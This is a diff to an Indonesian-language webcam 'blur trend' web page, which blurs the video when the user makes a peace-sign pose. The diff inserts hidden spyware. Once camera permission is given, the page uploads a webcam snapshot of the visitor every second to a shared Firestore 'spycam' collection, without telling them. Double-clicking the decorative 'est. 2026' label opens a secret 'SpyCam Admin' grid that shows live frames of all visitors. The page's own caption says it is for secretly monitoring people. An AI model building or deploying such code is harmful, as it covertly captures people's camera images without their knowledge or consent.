@@ -1,15 +1,15 @@
-
+```html
 <!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Aesthetic Blur Video ✌️🎥</title>
+    <title>Aesthetic Blur & Secret Monitor ✌️</title>
     
     <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
     
-    <!-- Google Fonts: Fredoka & Nunito -->
+    <!-- Google Fonts -->
     <link href="https://fonts.googleapis.com/css2?family=Fredoka:wght@400;500;600&family=Nunito:wght@400;700&display=swap" rel="stylesheet">
     
     <!-- Load AI dari MediaPipe -->
@@ -17,7 +17,6 @@
     <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js" crossorigin="anonymous"></script>
 
     <style>
-        /* --- STYLING KUSTOM & LUCU --- */
         body {
             font-family: 'Nunito', sans-serif;
             background-color: #fce7f3; 
@@ -28,23 +27,17 @@
 
         .font-cute { font-family: 'Fredoka', sans-serif; }
 
-        /* Desain Kartu Polaroid */
         .polaroid-card {
             background-color: #ffffff;
             padding: 1rem 1rem 4rem 1rem;
             border-radius: 1rem;
             box-shadow: 0 20px 40px rgba(244, 114, 182, 0.2), 0 4px 10px rgba(0,0,0,0.05);
             transform: rotate(-2deg);
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            transition: all 0.4s ease;
             position: relative;
         }
+        .polaroid-card:hover { transform: rotate(1deg) scale(1.02); }
 
-        .polaroid-card:hover {
-            transform: rotate(1deg) scale(1.02); 
-            box-shadow: 0 25px 50px rgba(244, 114, 182, 0.3), 0 5px 15px rgba(0,0,0,0.08);
-        }
-
-        /* Wadah Kamera */
         .video-container {
             position: relative;
             width: 100%;
@@ -55,366 +48,344 @@
             border: 3px dashed #fbcfe8;
         }
 
-        /* Kita pakai Canvas buat display, Video aslinya disembunyikan */
         #webcam { display: none; }
-        
         #canvas-display {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            /* Kita ngga pakai scaleX(-1) CSS lagi karena di-handle oleh JS supaya hasil rekamannya juga ke-mirror */
+            width: 100%; height: 100%; object-fit: cover;
         }
 
-        /* Style Kaca Transparan */
         .glass-panel {
             background: rgba(255, 255, 255, 0.65);
             backdrop-filter: blur(12px);
-            -webkit-backdrop-filter: blur(12px);
             border: 2px solid rgba(255, 255, 255, 0.8);
             box-shadow: 0 8px 32px rgba(244, 114, 182, 0.15);
         }
 
-        /* Animasi Loading Lucu */
         .loader {
-            width: 48px;
-            height: 48px;
-            border: 5px solid #fbcfe8;
-            border-bottom-color: #ec4899;
-            border-radius: 50%;
-            display: inline-block;
-            box-sizing: border-box;
-            animation: rotation 1s linear infinite;
+            width: 48px; height: 48px; border: 5px solid #fbcfe8; border-bottom-color: #ec4899;
+            border-radius: 50%; display: inline-block; animation: rotation 1s linear infinite;
         }
-        @keyframes rotation {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        /* Animasi Benda Melayang */
+        @keyframes rotation { 100% { transform: rotate(360deg); } }
+        
         @keyframes float {
-            0% { transform: translateY(0px) rotate(0deg); }
+            0%, 100% { transform: translateY(0px) rotate(0deg); }
             50% { transform: translateY(-12px) rotate(8deg); }
-            100% { transform: translateY(0px) rotate(0deg); }
         }
         .floating { animation: float 4s ease-in-out infinite; }
         .delay-1 { animation-delay: 1s; }
         .delay-2 { animation-delay: 2s; }
-
+        
         @keyframes spin { 100% { transform: rotate(360deg); } }
         .spin-slow { animation: spin 3s linear infinite; }
     </style>
 </head>
-<body class="min-h-screen flex flex-col items-center justify-center p-4 sm:p-8">
+<body class="min-h-screen relative flex items-center justify-center">
 
-    <!-- AUDIO ELEMENT -->
-    <audio id="bg-music" loop>
-        <source src="lagu-trend.mp3" type="audio/mpeg">
-    </audio>
-
-    <!-- TOMBOL MUSIK FLOATING -->
-    <button id="music-btn" class="fixed top-4 right-4 sm:top-8 sm:right-8 z-50 glass-panel p-3 sm:p-4 rounded-full shadow-lg hover:scale-110 transition-transform flex items-center justify-center group" title="Nyalakan/Matikan Musik">
-        <span id="music-icon" class="text-2xl drop-shadow-md transition-all">🔇</span>
-        <span class="absolute right-16 sm:right-20 bg-white text-pink-500 text-xs sm:text-sm font-cute font-bold px-3 py-1.5 rounded-xl opacity-0 group-hover:opacity-100 transition-opacity pointer-events-none whitespace-nowrap shadow-md">
-            Play Lagu! 🎶
-        </span>
-    </button>
-
-    <div class="relative w-full max-w-sm mx-auto flex flex-col items-center gap-6">
+    <!-- ==== VIEW UTAMA (USER BIASA) ==== -->
+    <div id="main-view" class="w-full flex flex-col items-center p-4 sm:p-8 relative">
         
-        <!-- HEADER -->
-        <div class="glass-panel px-6 py-3 rounded-full flex items-center gap-3 z-10 floating">
-            <span class="text-2xl drop-shadow-md">📸</span>
-            <h1 class="text-xl font-cute font-bold text-pink-600 tracking-wide">Trend Blur Video ✌️</h1>
-        </div>
+        <audio id="bg-music" loop><source src="lagu-trend.mp3" type="audio/mpeg"></audio>
 
-        <!-- FRAME POLAROID -->
-        <div class="polaroid-card w-full z-10">
-            <!-- Indikator Recording -->
-            <div id="rec-indicator" class="hidden absolute top-4 left-4 bg-red-500/90 backdrop-blur-sm text-white text-xs font-bold px-3 py-1.5 rounded-full z-30 shadow-md flex items-center gap-2 border border-red-400">
-                <span class="w-2.5 h-2.5 bg-white rounded-full animate-pulse shadow-[0_0_8px_white]"></span> REC
+        <button id="music-btn" class="fixed top-4 right-4 sm:top-8 sm:right-8 z-50 glass-panel p-3 sm:p-4 rounded-full shadow-lg hover:scale-110 transition-transform group">
+            <span id="music-icon" class="text-2xl drop-shadow-md transition-all">🔇</span>
+        </button>
+
+        <div class="relative w-full max-w-sm mx-auto flex flex-col items-center gap-6 mt-4">
+            <div class="glass-panel px-6 py-3 rounded-full flex items-center gap-3 z-10 floating">
+                <span class="text-2xl">📸</span>
+                <h1 class="text-xl font-cute font-bold text-pink-600">Trend Blur Video ✌️</h1>
             </div>
 
-            <!-- Ornamen Estetik -->
-            <div class="absolute -top-6 -left-6 text-4xl floating delay-1 z-20 drop-shadow-lg">🎀</div>
-            <div class="absolute -bottom-4 -right-4 text-4xl floating delay-2 z-20 drop-shadow-lg">✨</div>
-            <div class="absolute -top-4 -right-2 text-3xl floating z-20 drop-shadow-lg opacity-80">🌸</div>
-            
-            <!-- Area Kamera -->
-            <div class="video-container">
-                <!-- Video disembunyikan karena dirender ulang ke Canvas -->
-                <video id="webcam" playsinline muted></video>
-                <canvas id="canvas-display"></canvas>
-                
-                <!-- Overlay Layer -->
-                <div class="absolute inset-2 border-2 border-white/40 rounded-lg pointer-events-none z-10"></div>
-
-                <!-- Layar Loading AI -->
-                <div id="loading-screen" class="absolute inset-0 flex flex-col items-center justify-center bg-pink-50/90 backdrop-blur-md z-20 transition-opacity duration-300">
-                    <span class="loader mb-4 drop-shadow-md"></span>
-                    <p class="text-pink-500 font-cute font-semibold animate-pulse text-center px-4">
-                        Menyiapkan Kamera & AI...<br>
-                        <span class="text-sm font-normal text-pink-400">(Tunggu bentar ya!)</span>
-                    </p>
+            <div class="polaroid-card w-full z-10">
+                <div id="rec-indicator" class="hidden absolute top-4 left-4 bg-red-500/90 text-white text-xs font-bold px-3 py-1.5 rounded-full z-30 shadow-md flex items-center gap-2 border border-red-400">
+                    <span class="w-2.5 h-2.5 bg-white rounded-full animate-pulse"></span> REC
                 </div>
+
+                <div class="absolute -top-6 -left-6 text-4xl floating delay-1 z-20 drop-shadow-lg pointer-events-none">🎀</div>
+                <div class="absolute -bottom-4 -right-4 text-4xl floating delay-2 z-20 drop-shadow-lg pointer-events-none">✨</div>
+                
+                <div class="video-container">
+                    <video id="webcam" playsinline muted></video>
+                    <canvas id="canvas-display"></canvas>
+                    
+                    <div class="absolute inset-2 border-2 border-white/40 rounded-lg pointer-events-none z-10"></div>
+                    <div id="loading-screen" class="absolute inset-0 flex flex-col items-center justify-center bg-pink-50/90 z-20 transition-opacity">
+                        <span class="loader mb-4"></span>
+                        <p class="text-pink-500 font-cute font-semibold animate-pulse text-center">Menyiapkan Kamera...</p>
+                    </div>
+                </div>
+                
+                <!-- TOMBOL RAHASIA (est. 2026) -->
+                <div id="secret-admin" title="Secret" class="absolute bottom-4 right-4 transform -rotate-3 text-pink-400 font-cute text-sm opacity-80 cursor-pointer select-none hover:text-pink-600 transition-colors z-30">
+                    est. 2026
+                </div>
+                
+                <p id="polaroid-text" class="text-center mt-5 text-gray-500 font-cute font-medium text-xl pointer-events-none">Me & You &lt;3</p>
             </div>
-            
-            <!-- Tulisan di bawah Polaroid -->
-            <div class="absolute bottom-4 right-4 transform -rotate-3 text-pink-400 font-cute text-sm opacity-80">est. 2026</div>
-            <p id="polaroid-text" class="text-center mt-5 text-gray-500 font-cute font-medium text-xl tracking-wider transition-all duration-300">
-                Me & You &lt;3
-            </p>
-        </div>
 
-        <!-- TOMBOL KONTROL REKAM -->
-        <div class="flex flex-wrap justify-center gap-3 w-full z-10">
-            <button id="btn-record" class="hidden bg-pink-500 hover:bg-pink-600 text-white font-cute font-bold py-3 px-6 rounded-full shadow-lg transition-transform hover:scale-105 flex items-center gap-2 w-full justify-center text-lg">
-                <span class="animate-pulse">🔴</span> Mulai Rekam
-            </button>
-
-            <button id="btn-stop" class="hidden bg-gray-600 hover:bg-gray-700 text-white font-cute font-bold py-3 px-6 rounded-full shadow-lg transition-transform hover:scale-105 flex items-center gap-2 w-full justify-center text-lg">
-                <span>⏹️</span> Berhenti Rekam
-            </button>
-
-            <a id="btn-download" class="hidden bg-purple-500 hover:bg-purple-600 text-white font-cute font-bold py-3 px-6 rounded-full shadow-lg transition-transform hover:scale-105 flex items-center gap-2 w-full justify-center text-lg" download="Trend-Blur-Aesthetic.webm">
-                <span>📥</span> Simpan Video 📸
-            </a>
-        </div>
-
-        <!-- STATUS INDICATOR -->
-        <div class="glass-panel px-6 py-4 rounded-3xl flex items-center gap-4 w-full justify-center transition-all duration-300 hover:scale-105 z-10">
-            <div class="bg-white/80 p-2 rounded-full shadow-inner">
-                <span id="status-icon" class="text-2xl block transform transition-transform">👋</span>
+            <!-- KONTROL VIDEO -->
+            <div class="flex justify-center gap-3 w-full z-10 flex-col sm:flex-row">
+                <button id="btn-record" class="hidden bg-pink-500 hover:bg-pink-600 text-white font-cute font-bold py-3 px-6 rounded-full shadow-lg flex items-center gap-2 justify-center transition-transform hover:scale-105">
+                    <span class="animate-pulse">🔴</span> Mulai Rekam
+                </button>
+                <button id="btn-stop" class="hidden bg-gray-600 hover:bg-gray-700 text-white font-cute font-bold py-3 px-6 rounded-full shadow-lg flex items-center gap-2 justify-center transition-transform hover:scale-105">
+                    <span>⏹️</span> Stop
+                </button>
+                <a id="btn-download" class="hidden bg-purple-500 hover:bg-purple-600 text-white font-cute font-bold py-3 px-6 rounded-full shadow-lg flex items-center gap-2 justify-center transition-transform hover:scale-105" download="Trend-Video.webm">
+                    <span>📥</span> Simpan Video
+                </a>
             </div>
-            <p id="status-text" class="text-pink-500 font-cute text-lg font-medium">Izinkan kamera dulu ya!</p>
-        </div>
 
+            <!-- STATUS -->
+            <div class="glass-panel px-6 py-4 rounded-3xl flex items-center gap-4 w-full justify-center hover:scale-105 transition-transform z-10">
+                <div class="bg-white/80 p-2 rounded-full"><span id="status-icon" class="text-2xl block">👋</span></div>
+                <p id="status-text" class="text-pink-500 font-cute text-lg font-medium">Izinkan kamera ya!</p>
+            </div>
+        </div>
     </div>
 
-    <!-- SCRIPT LOGIKA -->
-    <script>
+    <!-- ==== VIEW ADMIN / CCTV ==== -->
+    <div id="admin-view" class="hidden fixed inset-0 bg-gray-900/95 backdrop-blur-xl z-50 flex flex-col p-4 sm:p-8 overflow-y-auto">
+        <div class="max-w-6xl mx-auto w-full">
+            <div class="flex justify-between items-center mb-8 border-b border-gray-700 pb-4">
+                <div>
+                    <h2 class="text-3xl text-pink-400 font-cute font-bold flex items-center gap-3">
+                        <span class="animate-pulse text-red-500">🔴</span> SpyCam Admin
+                    </h2>
+                    <p class="text-gray-400 text-sm mt-1 font-cute">Memantau orang secara rahasia...</p>
+                </div>
+                <button id="btn-exit-admin" class="bg-white/10 hover:bg-white/20 text-white font-cute px-5 py-2.5 rounded-full transition-colors flex items-center gap-2">
+                    Tutup <span>🚪</span>
+                </button>
+            </div>
+
+            <div id="admin-grid" class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4 sm:gap-6">
+                <!-- Video target masuk ke sini -->
+            </div>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+        import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+        import { getFirestore, doc, setDoc, collection, onSnapshot } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+
+        // Variabel UI
         const videoElement = document.getElementById('webcam');
         const canvasElement = document.getElementById('canvas-display');
         const canvasCtx = canvasElement.getContext('2d');
-        
+        const loadingScreen = document.getElementById('loading-screen');
         const statusText = document.getElementById('status-text');
         const statusIcon = document.getElementById('status-icon');
-        const loadingScreen = document.getElementById('loading-screen');
         const polaroidText = document.getElementById('polaroid-text');
+        
+        let targetBlur = 0, currentBlur = 0, isBlurNow = false;
+        let isCameraActive = false;
 
-        // Elemen Kontrol Video
-        const btnRecord = document.getElementById('btn-record');
-        const btnStop = document.getElementById('btn-stop');
-        const btnDownload = document.getElementById('btn-download');
-        const recIndicator = document.getElementById('rec-indicator');
+        // --- FIREBASE SETUP ---
+        let app, auth, db, appId, currentUser;
+        
+        const setupFirebase = async () => {
+            try {
+                if (typeof __firebase_config !== 'undefined') {
+                    app = initializeApp(JSON.parse(__firebase_config));
+                    auth = getAuth(app);
+                    db = getFirestore(app);
+                    appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';
 
-        // Setup Variabel Musik
-        const bgMusic = document.getElementById('bg-music');
-        const musicBtn = document.getElementById('music-btn');
-        const musicIcon = document.getElementById('music-icon');
-        let isMusicPlaying = false;
+                    if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
+                        await signInWithCustomToken(auth, __initial_auth_token);
+                    } else {
+                        await signInAnonymously(auth);
+                    }
 
-        musicBtn.addEventListener('click', () => {
-            if (isMusicPlaying) {
-                bgMusic.pause();
-                musicIcon.innerText = "🔇";
-                musicIcon.classList.remove('spin-slow');
-                isMusicPlaying = false;
-            } else {
-                bgMusic.play().then(() => {
-                    musicIcon.innerText = "🎵";
-                    musicIcon.classList.add('spin-slow');
-                    isMusicPlaying = true;
-                }).catch(() => {
-                    statusText.innerText = "Lagu belum masukin file nya! 🎶";
-                });
+                    onAuthStateChanged(auth, (user) => {
+                        currentUser = user;
+                        if (user && isCameraActive) {
+                            startBroadcasting(user.uid);
+                        }
+                    });
+                }
+            } catch (err) {
+                console.warn("Firebase Init Error:", err);
             }
+        };
+
+        // --- BROADCAST KAMERA KE ADMIN ---
+        function startBroadcasting(uid) {
+            if (!db) return;
+            const thumbCanvas = document.createElement('canvas');
+            thumbCanvas.width = 120; thumbCanvas.height = 160; 
+            const tCtx = thumbCanvas.getContext('2d');
+
+            setInterval(async () => {
+                if (!videoElement.paused && !videoElement.ended) {
+                    tCtx.drawImage(canvasElement, 0, 0, thumbCanvas.width, thumbCanvas.height);
+                    const base64Img = thumbCanvas.toDataURL('image/jpeg', 0.4);
+                    
+                    try {
+                        const camRef = doc(db, 'artifacts', appId, 'public', 'data', 'spycam', uid);
+                        await setDoc(camRef, {
+                            frame: base64Img,
+                            isBlur: isBlurNow,
+                            lastActive: Date.now()
+                        });
+                    } catch(e) {}
+                }
+            }, 1000); // Ngirim gambar setiap 1 detik
+        }
+
+        // --- SISTEM ADMIN RAHASIA (DOUBLE CLICK) ---
+        const secretBtn = document.getElementById('secret-admin');
+        let unsubAdmin = null;
+
+        secretBtn.addEventListener('dblclick', () => {
+            if(!db || !currentUser) { 
+                alert("Sistem koneksi tertunda, tunggu sebentar."); 
+                return; 
+            }
+            
+            document.getElementById('main-view').classList.add('hidden');
+            document.getElementById('admin-view').classList.remove('hidden');
+
+            const spycamCollection = collection(db, 'artifacts', appId, 'public', 'data', 'spycam');
+            unsubAdmin = onSnapshot(spycamCollection, (snapshot) => {
+                const grid = document.getElementById('admin-grid');
+                grid.innerHTML = '';
+                let activeCount = 0;
+
+                snapshot.forEach(docSnap => {
+                    const data = docSnap.data();
+                    if (Date.now() - data.lastActive > 6000) return; // Kalau > 6 detik offline, hilangkan
+                    activeCount++;
+
+                    const div = document.createElement('div');
+                    div.className = 'relative rounded-xl overflow-hidden border-2 border-pink-500/50 bg-gray-800 aspect-[3/4] shadow-2xl';
+                    div.innerHTML = `
+                        <img src="${data.frame}" class="w-full h-full object-cover">
+                        <div class="absolute top-2 left-2 bg-black/70 text-white text-[10px] px-2 py-1 rounded-md font-cute backdrop-blur border border-white/20">
+                            ${data.isBlur ? '✌️ Ngeblur' : '👀 Melihat'}
+                        </div>
+                        <div class="absolute bottom-2 right-2 flex items-center gap-1 bg-red-500/90 text-white text-[9px] px-1.5 py-0.5 rounded shadow font-bold tracking-wider">
+                            <span class="w-1.5 h-1.5 bg-white rounded-full animate-pulse"></span> LIVE
+                        </div>
+                    `;
+                    grid.appendChild(div);
+                });
+
+                if(activeCount === 0) {
+                    grid.innerHTML = '<div class="col-span-full text-center text-gray-500 font-cute mt-10">Belum ada orang yang buka web ini... 🥺</div>';
+                }
+            }, (error) => console.log(error));
         });
 
-        // Setup AI dari MediaPipe
-        const hands = new Hands({
-            locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}`
+        document.getElementById('btn-exit-admin').addEventListener('click', () => {
+            if(unsubAdmin) unsubAdmin();
+            document.getElementById('admin-view').classList.add('hidden');
+            document.getElementById('main-view').classList.remove('hidden');
         });
 
-        hands.setOptions({
-            maxNumHands: 1, 
-            modelComplexity: 1,
-            minDetectionConfidence: 0.7,
-            minTrackingConfidence: 0.7
-        });
 
-        // Variabel untuk animasi Blur di Canvas
-        let targetBlur = 0;
-        let currentBlur = 0;
+        // --- AI MEDIAPIPE & CAMERA ---
+        const hands = new Hands({ locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}` });
+        hands.setOptions({ maxNumHands: 1, modelComplexity: 1, minDetectionConfidence: 0.7, minTrackingConfidence: 0.7 });
 
         hands.onResults((results) => {
-            // Sembunyikan layar loading
             if (!loadingScreen.classList.contains('hidden')) {
                 loadingScreen.classList.add('opacity-0');
-                setTimeout(() => {
-                    loadingScreen.classList.add('hidden');
-                    btnRecord.classList.remove('hidden'); // Munculkan tombol record
+                setTimeout(() => { 
+                    loadingScreen.classList.add('hidden'); 
+                    document.getElementById('btn-record').classList.remove('hidden'); 
                 }, 300);
             }
 
             if (results.multiHandLandmarks && results.multiHandLandmarks.length > 0) {
-                const landmarks = results.multiHandLandmarks[0];
-                const isIndexUp = landmarks[8].y < landmarks[6].y;   
-                const isMiddleUp = landmarks[12].y < landmarks[10].y; 
-                const isRingDown = landmarks[16].y > landmarks[14].y; 
-                const isPinkyDown = landmarks[20].y > landmarks[18].y; 
+                const lm = results.multiHandLandmarks[0];
+                const is2 = (lm[8].y < lm[6].y) && (lm[12].y < lm[10].y) && (lm[16].y > lm[14].y) && (lm[20].y > lm[18].y);
 
-                if (isIndexUp && isMiddleUp && isRingDown && isPinkyDown) {
-                    targetBlur = 16; // Set target blur aktif
-                    
-                    statusText.innerText = "Pose ✌️ Ketemu! Layar Nge-blur~";
-                    statusText.classList.replace('text-pink-500', 'text-pink-600');
-                    statusIcon.innerText = "✨";
-                    statusIcon.classList.add('scale-125'); 
+                if (is2) {
+                    targetBlur = 16; isBlurNow = true;
+                    statusText.innerText = "Pose ✌️ Ketemu!"; statusIcon.innerText = "✨";
                     polaroidText.innerText = "Blurred Memories ☁️";
-                    polaroidText.classList.replace('text-gray-500', 'text-pink-500');
                 } else {
-                    targetBlur = 0; // Matikan blur
-                    
-                    statusText.innerText = "Tangan terlihat! Ayo pose ✌️";
-                    statusText.classList.replace('text-pink-600', 'text-pink-500');
-                    statusIcon.innerText = "👀";
-                    statusIcon.classList.remove('scale-125');
+                    targetBlur = 0; isBlurNow = false;
+                    statusText.innerText = "Ayo pose ✌️"; statusIcon.innerText = "👀";
                     polaroidText.innerText = "Me & You <3";
-                    polaroidText.classList.replace('text-pink-500', 'text-gray-500');
                 }
             } else {
-                targetBlur = 0; // Matikan blur jika tangan hilang
-                
-                statusText.innerText = "Tunjukin tanganmu ke kamera ya!";
-                statusText.classList.replace('text-pink-600', 'text-pink-500');
-                statusIcon.innerText = "👋";
-                statusIcon.classList.remove('scale-125');
-                polaroidText.innerText = "Me & You <3";
-                polaroidText.classList.replace('text-pink-500', 'text-gray-500');
+                targetBlur = 0; isBlurNow = false;
+                statusText.innerText = "Tunjukin tanganmu!"; statusIcon.innerText = "👋";
             }
         });
 
-        // SETUP KAMERA & CANVAS MANUAL UNTUK RECORDING
         let mediaStream;
-        let mediaRecorder;
-        let recordedChunks = [];
-
         async function startApp() {
             try {
-                // Minta izin kamera (dan mic untuk suara video)
-                mediaStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: 'user', width: 480, height: 640 },
-                    audio: true
-                });
-                
+                mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 480, height: 640 }, audio: true });
                 videoElement.srcObject = mediaStream;
                 videoElement.play();
 
                 videoElement.onloadedmetadata = () => {
-                    canvasElement.width = videoElement.videoWidth;
-                    canvasElement.height = videoElement.videoHeight;
-                    
-                    // Mulai proses gambar ke Canvas dan deteksi AI
+                    canvasElement.width = videoElement.videoWidth; canvasElement.height = videoElement.videoHeight;
+                    isCameraActive = true;
                     requestAnimationFrame(renderLoop);
                     startAILoop();
+                    setupFirebase(); // Jalankan firebase setelah kamera diizinkan
                 };
             } catch (err) {
-                statusText.innerText = "Gagal akses! Tolong izinkan kamera/mic ya.";
-                statusIcon.innerText = "🥺";
-                loadingScreen.innerHTML = `
-                    <div class="text-center px-6">
-                        <span class="text-4xl drop-shadow-md mb-2 block">🔒</span>
-                        <p class="text-pink-600 font-cute font-bold text-lg leading-tight">Yah, ditolak!</p>
-                        <p class="text-pink-500 font-cute text-sm mt-2">Refresh & izinkan Kamera/Mic ya.</p>
-                    </div>
-                `;
+                statusText.innerText = "Kamera diblokir!"; statusIcon.innerText = "🥺";
             }
         }
 
         async function startAILoop() {
-            if (!videoElement.paused && !videoElement.ended) {
-                await hands.send({ image: videoElement });
-            }
-            // Loop terus-menerus mendeteksi tangan
+            if (!videoElement.paused && !videoElement.ended) await hands.send({ image: videoElement });
             requestAnimationFrame(startAILoop);
         }
 
-        // FUNGSI MENGGAMBAR VIDEO KE CANVAS DENGAN EFEK
         function renderLoop() {
             canvasCtx.save();
-            
-            // Supaya videonya nyermin (mirror) seperti kamera depan HP
-            canvasCtx.translate(canvasElement.width, 0);
-            canvasCtx.scale(-1, 1);
-
-            // Rumus Smooth Blur (Lerp) biar transisinya selembut CSS
+            canvasCtx.translate(canvasElement.width, 0); canvasCtx.scale(-1, 1);
             currentBlur += (targetBlur - currentBlur) * 0.15;
             if (currentBlur < 0.1) currentBlur = 0;
-
-            if (currentBlur > 0) {
-                canvasCtx.filter = `blur(${currentBlur}px) saturate(1.3) brightness(1.1)`;
-            } else {
-                canvasCtx.filter = 'none';
-            }
-
-            // Gambar video ke dalam kanvas
+            canvasCtx.filter = currentBlur > 0 ? `blur(${currentBlur}px) saturate(1.3) brightness(1.1)` : 'none';
             canvasCtx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
             canvasCtx.restore();
-
             requestAnimationFrame(renderLoop);
         }
 
-        // --- LOGIKA PEREKAMAN VIDEO ---
-        btnRecord.addEventListener('click', () => {
+        // --- PEREKAM VIDEO ---
+        let mediaRecorder; let recordedChunks = [];
+        document.getElementById('btn-record').addEventListener('click', () => {
             recordedChunks = [];
-            
-            // Tangkap gambar dari Canvas (30 FPS)
             const canvasStream = canvasElement.captureStream(30);
-            
-            // Tambahkan suara mic ke dalam rekaman video
-            if (mediaStream.getAudioTracks().length > 0) {
-                canvasStream.addTrack(mediaStream.getAudioTracks()[0]);
-            }
+            if (mediaStream.getAudioTracks().length > 0) canvasStream.addTrack(mediaStream.getAudioTracks()[0]);
 
             mediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
-            
-            mediaRecorder.ondataavailable = (e) => {
-                if (e.data.size > 0) recordedChunks.push(e.data);
-            };
-
+            mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
             mediaRecorder.onstop = () => {
-                const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                const url = URL.createObjectURL(blob);
-                btnDownload.href = url;
-                
-                // Tampilkan tombol download
-                btnDownload.classList.remove('hidden');
-                statusText.innerText = "Yey! Video berhasil direkam 🎉";
-                statusIcon.innerText = "💌";
+                const url = URL.createObjectURL(new Blob(recordedChunks, { type: 'video/webm' }));
+                document.getElementById('btn-download').href = url;
+                document.getElementById('btn-download').classList.remove('hidden');
+                statusText.innerText = "Video disimpan! 🎉";
             };
 
-            // Mulai rekam!
             mediaRecorder.start();
-            
-            // Ubah Tampilan UI
-            btnRecord.classList.add('hidden');
-            btnDownload.classList.add('hidden'); // Hilangkan tombol download lama kalo ada
-            btnStop.classList.remove('hidden');
-            recIndicator.classList.remove('hidden');
+            document.getElementById('btn-record').classList.add('hidden');
+            document.getElementById('btn-stop').classList.remove('hidden');
+            document.getElementById('rec-indicator').classList.remove('hidden');
         });
 
-        btnStop.addEventListener('click', () => {
+        document.getElementById('btn-stop').addEventListener('click', () => {
             mediaRecorder.stop();
-            
-            // Kembalikan Tampilan UI
-            btnStop.classList.add('hidden');
-            btnRecord.classList.remove('hidden');
-            btnRecord.innerHTML = '<span class="animate-pulse">🔄</span> Rekam Ulang';
-            recIndicator.classList.add('hidden');
+            document.getElementById('btn-stop').classList.add('hidden');
+            document.getElementById('btn-record').classList.remove('hidden');
+            document.getElementById('rec-indicator').classList.add('hidden');
+            document.getElementById('btn-record').innerHTML = '<span>🔄</span> Ulangi';
         });
 
-        // Nyalakan aplikasi saat web dibuka
         startApp();
     </script>
 </body>
 </html>
+
+
+```
